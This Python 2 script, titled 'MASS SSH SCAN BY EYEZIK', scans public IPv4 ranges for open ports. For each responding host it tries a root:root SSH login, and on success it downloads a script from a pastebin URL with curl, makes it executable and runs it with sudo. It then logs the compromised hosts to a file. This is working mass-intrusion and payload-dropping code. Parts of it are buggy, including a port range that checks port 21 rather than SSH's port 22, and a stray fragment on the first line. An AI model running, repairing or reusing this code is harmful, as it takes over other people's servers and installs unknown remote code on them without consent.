import sys #ERRORS that i havent fixed i = self.expect(["(?i)are you sure you want to continue connecting", original_prompt, "(?i)(?:password)|(?:passphrase for key)", "(?i)permission denied"
import random	
import socket
import getpass
import pxssh
import getpass
print "\n +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+"
print   " |----MASS SSH SCAN BY EYEZIK----|"
print   " +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+"
if (len(sys.argv) > 2):
	print "--mass-scan"
elif (len(sys.argv) < 2):
	print "--mass-scan"
else:
	if (sys.argv[1] == "--mass-scan"):
		STRTIP = raw_input("X.0.0.0 Start at?: ")
		for p in xrange(int(STRTIP),255):
			#print str(p) + "." + str(q) + "." + str(r) + "." + str(s) 
			for q in xrange(0,255):
				#print str(p) + "." + str(q) + "." + str(r) + "." + str(s)
				for r in xrange(4,255):
					#print str(p) + "." + str(q) + "." + str(r) + "." + str(s)
					for s in xrange(0,255):
						ip = str(p) + "." + str(q) + "." + str(r) + "." + str(s)
						if (p==10 or p==127):
							#Private IP and Loopback IP
							ip = "null"
						elif (p == 100 and q >= 64 and q <= 127):
							#Shared Address Space
							ip = "null"
						elif (p >= 0 and p <= 15 and q >= 0 and q <= 20):
							#STARTS ON 15.20.X.X
							ip = "null"
						elif (p == 169 and q == 254):
							# APIPA
							ip = "null"
						elif (p == 172 and q >= 16 and q <= 31):
							#Private IP  172.16.0.0 - 172.31.255.255 
							ip = "null"
						elif (p == 192 and q == 0 and r == 0):
							#192.0.0.0/24        # RFC6890: IETF Protocol Assignments
							ip = "null"
						elif (p == 192 and q == 0 and r == 2):
							#192.0.2.0/24        # RFC5737: Documentation (TEST-NET-1)
							ip = "null"
						elif (p == 192 and q == 88 and r == 99):
							#192.88.99.0/24      # RFC3068: 6to4 Relay Anycast
							ip = "null"
						elif (p == 192 and q == 168):
							#RFC1918: Private-Use
							ip = "null"
						elif (p == 192 and q == 18):
							# RFC2544: Benchmarking
							ip = "null"
						elif (p == 192 and q == 19):
							# RFC2544: Benchmarking
							ip = "null"
						elif (p == 192 and q == 51 and r == 100):
							# RFC5737: Documentation (TEST-NET-2)
							ip = "null"
						elif (p == 203 and r == 113):
							# RFC5737: Documentation (TEST-NET-2)
							ip = "null"
						elif (p >= 224):
							# RFC5737: Reserved D & E
							ip = "null"
						if (ip != "null"):
							print ip
							try:
							    for port in range (21, 22):
							        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
								sock.settimeout(0.5)
							        result = sock.connect_ex((ip, port))
								
						        	if result == 0:
									print "SSH FOUND {}".format(ip, port)
									try:
									    f = open("SSH.txt","a")
								            f.write(ip)
								            f.write("\n")
								            f.close()
									    s = pxssh.pxssh()
									    hostname = ip
									    username = ('root')
									    password = ('root')
									    s.login(hostname, username, password)
									    s.sendline('sudo curl -L https://pastebin.com/raw/ArHqXVnU -o groovy.sh')
									    s.prompt()
									    s.sendline('sudo chmod 777 groovy.sh')
									    s.prompt()
									    s.sendline('sudo ./groovy.sh')
									    s.prompt() #so this tests if root:root works on ssh and if so it will shell the hoe, and then log it
									    f = open("root_logins.txt","a")
									    f.write(ip)
									    f.write("\n")
									    f.close()
									    s.logout()
									except pxssh.ExceptionPxssh as e:
									    print("ssh failed on login.")
									    print(e)
								sock.close()
							except socket.error:
								print "Couldn't connect to server"
							except socket.gaierror:
 								print 'Hostname could not be resolved. Exiting'
